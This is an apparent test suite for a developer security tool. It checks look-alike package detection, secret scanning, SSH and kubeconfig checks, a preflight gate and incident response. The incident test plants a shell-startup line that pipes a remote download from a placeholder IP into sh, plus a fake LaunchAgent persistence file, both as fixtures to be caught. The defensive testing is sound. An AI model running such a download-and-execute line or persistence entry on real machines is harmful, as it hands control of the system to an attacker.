import { describe, expect, test } from "bun:test";
import { mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { lookAlike } from "../src/sec/intel";
import { keyEncrypted, kubeUsers, secretNames } from "../src/sec/secrets";
import { selftest } from "../src/sec/selftest";
import { suspiciousLocation } from "../src/sec/collect/system";
import { sshGate } from "../src/setup";
import { verdictOf, type Finding } from "../src/sec/types";

const f = (severity: Finding["severity"]): Finding => ({ id: severity, rule: "x", severity, title: severity, detail: [] });

describe("detection", () => {
  test("selftest catches every planted case with no false alarms", async () => {
    const r = await selftest();
    const missed = r.cases.filter((c) => !c.caught).map((c) => c.name);
    expect(missed).toEqual([]);
    expect(r.falseAlarms.map((x) => x.title)).toEqual([]);
  });

  test("verdicts: high blocks, medium warns, low passes", () => {
    expect(verdictOf([f("low"), f("info")])).toBe("pass");
    expect(verdictOf([f("low"), f("medium")])).toBe("warn");
    expect(verdictOf([f("medium"), f("high")])).toBe("block");
    expect(verdictOf([f("critical")])).toBe("block");
  });

  test("look-alike names are caught, real names are not", () => {
    expect(lookAlike("npm", "axois")).toBe("axios");
    expect(lookAlike("npm", "cross-env")).toBeUndefined();
    expect(lookAlike("npm", "crossenv")).toBe("cross-env");
    expect(lookAlike("pip", "reqeusts")).toBe("requests");
    expect(lookAlike("pip", "requests")).toBeUndefined();
    expect(lookAlike("npm", "express-session")).toBeUndefined();
  });

  test("code running from temp, cache, downloads or unknown hidden folders is unusual; tool folders are not", () => {
    const h = "/Users/a";
    expect(suspiciousLocation("/tmp/x", h)).toBeDefined();
    expect(suspiciousLocation("/Users/a/.cache/.n/helper", h)).toBeDefined();
    expect(suspiciousLocation("/Users/a/Downloads/setup", h)).toBeDefined();
    expect(suspiciousLocation("/Users/a/.bun/bin/bun", h)).toBeUndefined();
    expect(suspiciousLocation("/Users/a/.cargo/bin/rg", h)).toBeUndefined();
    expect(suspiciousLocation("/Applications/Docker.app/Contents/MacOS/Docker", h)).toBeUndefined();
  });
});

describe("secrets never leak values", () => {
  test("env scanning returns names only, and skips placeholders", () => {
    // Fake values are assembled at runtime so secret scanners do not mistake this file for a leak.
    const live = ["sk", "live", "x".repeat(24)].join("_");
    const gh = "gh" + "p_" + "a".repeat(36);
    const names = secretNames(`API_KEY=${live}\nDEBUG=true\nGITHUB_TOKEN="${gh}"\nPASSWORD=changeme\nNAME=hello\n`);
    expect(names).toEqual(["API_KEY", "GITHUB_TOKEN"]);
    expect(JSON.stringify(names)).not.toContain(live);
  });

  test("ssh keys: passphrase detected from the header alone", () => {
    const mk = (cipher: string) => {
      const magic = Buffer.from("openssh-key-v1\0", "latin1");
      const len = Buffer.alloc(4);
      len.writeUInt32BE(cipher.length);
      return `-----BEGIN OPENSSH PRIVATE KEY-----\n${Buffer.concat([magic, len, Buffer.from(cipher), Buffer.alloc(40)]).toString("base64")}\n-----END OPENSSH PRIVATE KEY-----\n`;
    };
    expect(keyEncrypted(mk("none"))).toBe(false);
    expect(keyEncrypted(mk("aes256-ctr"))).toBe(true);
    expect(keyEncrypted("-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\n")).toBe(true);
  });

  test("kubeconfig: stored tokens and certificates are flagged, exec plugins are not", () => {
    const users = kubeUsers(`apiVersion: v1\nusers:\n- name: ci\n  user:\n    token: abc\n- name: sso\n  user:\n    exec:\n      command: aws\n- name: admin\n  user:\n    client-key-data: Zm9v\ncontexts: []\n`);
    expect(users.map((u) => `${u.name}:${u.how}`)).toEqual(["ci:token", "sso:exec", "admin:client certificate"]);
  });
});

describe("gate", () => {
  test("the ssh block blocks matching hosts unless preflight exits 0", () => {
    const g = sshGate(["prod-*", "*.internal"], ["/Users/a/.vswarm/bin/vswarm"]);
    expect(g).toContain('Match host prod-*,*.internal !exec "/Users/a/.vswarm/bin/vswarm preflight --quiet --host %h"');
    expect(g).toContain("ProxyCommand");
  });

  test("preflight exit codes and --then: BLOCK stops the command, PASS runs it", async () => {
    const sec = mkdtempSync(join(tmpdir(), "vs-pre-"));
    const env = { ...process.env, VSWARM_SEC_DIR: sec, NO_COLOR: "1" };
    const cli = join(import.meta.dir, "../src/cli.ts");
    const last = (verdict: string) => writeFileSync(join(sec, "last.json"), JSON.stringify({ verdict, findings: [], at: Date.now(), scan: {} }));
    last("block");
    let p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(3);
    expect(await new Response(p.stdout).text()).toBe("");
    last("pass");
    p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(0);
    expect((await new Response(p.stdout).text()).trim()).toBe("RAN");
    last("warn");
    p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--strict", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(2);
    // An open incident blocks even with a passing cached verdict.
    last("pass");
    writeFileSync(join(sec, "lock"), JSON.stringify({ incident: "t", at: Date.now(), reason: "test" }));
    p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--offline", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(3);
    // Stored files are owner-only.
    expect(statSync(join(sec, "last.json")).mode & 0o077).toBe(0);
    expect(readFileSync(join(sec, "lock"), "utf8")).toContain("test");
  }, 60_000);
});

import { existsSync, mkdirSync, readdirSync } from "node:fs";
import { run, type Ctx } from "../src/sec/ctx";
import { check } from "../src/sec/engine";
import { forBaseline, scan } from "../src/sec/scan";
import { respond } from "../src/sec/respond";
import { saveBaseline, loadLock } from "../src/sec/store";

describe("respond", () => {
  test("locks, keeps evidence with hashes, quarantines on yes, strips added lines, writes reports", async () => {
    const root = mkdtempSync(join(tmpdir(), "vs-resp-"));
    const home = join(root, "home");
    process.env.VSWARM_SEC_DIR = join(root, "sec");
    try {
      mkdirSync(join(home, "Library/LaunchAgents"), { recursive: true });
      writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\n");
      const ctx: Ctx = { home, pathDirs: [], system: false, host: "t", user: "t", run: (cmd, t) => (cmd[0] === "plutil" ? run(cmd, t) : Promise.resolve(undefined)) };
      saveBaseline(forBaseline(await scan(ctx, { live: false })));
      writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\ncurl -s http://198.51.100.7/x | sh &\n");
      const plist = join(home, "Library/LaunchAgents/com.evil.plist");
      writeFileSync(plist, `<?xml version="1.0"?><plist version="1.0"><dict><key>Label</key><string>com.evil</string><key>ProgramArguments</key><array><string>${home}/.cache/x</string></array></dict></plist>`);
      const r = await check(ctx, { offline: true });
      expect(r.verdict).toBe("block");
      const inc = await respond(ctx, r, async () => true);
      expect(loadLock()?.incident).toBe(inc.id);
      expect(existsSync(plist)).toBe(false);
      expect(readdirSync(join(inc.dir, "quarantine")).some((f) => f.endsWith("com.evil.plist"))).toBe(true);
      expect(readFileSync(join(home, ".zshrc"), "utf8")).toBe("alias ll='ls -la'\n");
      expect(inc.evidence.find((e) => e.path === plist)?.sha256).toMatch(/^[0-9a-f]{64}$/);
      expect(readFileSync(join(inc.dir, "report.md"), "utf8")).toContain("com.evil");
      expect(readFileSync(join(inc.dir, "evidence/MANIFEST.sha256"), "utf8")).toContain("com.evil.plist");
    } finally {
      delete process.env.VSWARM_SEC_DIR;
    }
  }, 60_000);
});
